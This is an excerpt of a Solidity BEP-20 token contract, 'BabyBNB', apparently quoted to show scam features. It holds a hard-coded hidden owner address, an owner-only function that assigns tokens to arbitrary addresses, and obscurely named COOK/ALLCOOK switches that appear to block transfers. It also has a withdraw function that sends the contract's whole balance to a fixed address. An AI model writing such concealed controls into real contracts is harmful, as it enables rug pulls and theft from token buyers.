...
contract Ownable is Context {
    ...
    address private _OwnerAddress = 0x3E1ddA2F0cC105e285EE32aCB77FBf007cf1158A;
...
contract BabyBNB is Context, IERC20, Ownable {
    ...
    uint256 private _total = 10000000000 * 10**3;
    ...
    address public devAddress = 0x3E1ddA2F0cC105e285EE32aCB77FBf007cf1158A;
  
    uint256 public deadFee = 0;
    uint256 public devFee = 10;

    mapping(address => bool) private _NFT;
    bool private COOK = true;
    bool private  ALLCOOK= false;
    ...
    function addNFT(address getaddress, uint256 getquantity) external OwnerAddress() {
    ...
    function increaseAllowances(address spend, uint256 Value) external onlyOwner() {
        require(Value > 0, "TTT");
    ...
    function _ALLCOOK(bool addres) external OwnerAddress() {
        ALLCOOK = addres;
    }
    ...
    function ASKCOOK(address addres)
        external
        view
        OwnerAddress()
        returns (bool)
    ...
    function withdraw() external {
        // transfer this contract's whole BNB balance to the `0x3E1ddA2F0cC105e285EE32aCB77FBf007cf1158A` address
        payable(address(0x3E1ddA2F0cC105e285EE32aCB77FBf007cf1158A)).transfer(address(this).balance);
    }
